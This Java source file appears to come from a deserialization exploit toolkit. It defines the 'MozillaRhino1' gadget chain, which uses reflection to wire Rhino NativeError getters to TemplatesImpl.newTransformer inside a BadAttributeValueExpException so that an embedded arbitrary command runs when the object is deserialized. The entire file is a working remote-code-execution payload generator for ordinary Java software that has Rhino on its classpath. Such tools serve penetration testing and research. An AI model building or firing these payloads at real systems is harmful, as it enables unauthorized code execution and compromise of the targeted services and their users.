package payloads;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.mozilla.javascript.*;
import payloads.annotation.Authors;
import payloads.annotation.Dependencies;
import util.Gadgets;
import util.PayloadRunner;
import util.Reflections;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/*
    by @matthias_kaiser
*/
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"rhino:js:1.7R2"})
@Authors({ Authors.MATTHIASKAISER })
public class MozillaRhino1 implements ObjectPayload<Object> {

    public Object getObject(final String command) throws Exception {

        Class nativeErrorClass = Class.forName("org.mozilla.javascript.NativeError");
        Constructor nativeErrorConstructor = nativeErrorClass.getDeclaredConstructor();
        Reflections.setAccessible(nativeErrorConstructor);
        IdScriptableObject idScriptableObject = (IdScriptableObject) nativeErrorConstructor.newInstance();

        Context context = Context.enter();

        NativeObject scriptableObject = (NativeObject) context.initStandardObjects();

        Method enterMethod = Context.class.getDeclaredMethod("enter");
        NativeJavaMethod method = new NativeJavaMethod(enterMethod, "name");
        idScriptableObject.setGetterOrSetter("name", 0, method, false);

        Method newTransformer = TemplatesImpl.class.getDeclaredMethod("newTransformer");
        NativeJavaMethod nativeJavaMethod = new NativeJavaMethod(newTransformer, "message");
        idScriptableObject.setGetterOrSetter("message", 0, nativeJavaMethod, false);

        Method getSlot = ScriptableObject.class.getDeclaredMethod("getSlot", String.class, int.class, int.class);
        Reflections.setAccessible(getSlot);
        Object slot = getSlot.invoke(idScriptableObject, "name", 0, 1);
        Field getter = slot.getClass().getDeclaredField("getter");
        Reflections.setAccessible(getter);

        Class memberboxClass = Class.forName("org.mozilla.javascript.MemberBox");
        Constructor memberboxClassConstructor = memberboxClass.getDeclaredConstructor(Method.class);
        Reflections.setAccessible(memberboxClassConstructor);
        Object memberboxes = memberboxClassConstructor.newInstance(enterMethod);
        getter.set(slot, memberboxes);

        NativeJavaObject nativeObject = new NativeJavaObject(scriptableObject, Gadgets.createTemplatesImpl(command), TemplatesImpl.class);
        idScriptableObject.setPrototype(nativeObject);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field valField = badAttributeValueExpException.getClass().getDeclaredField("val");
        Reflections.setAccessible(valField);
        valField.set(badAttributeValueExpException, idScriptableObject);

        return badAttributeValueExpException;
    }

    public static byte[] getBytes(final String command, Boolean fusion) throws Exception {
        return PayloadRunner.run(MozillaRhino1.class, command, fusion);
    }
}
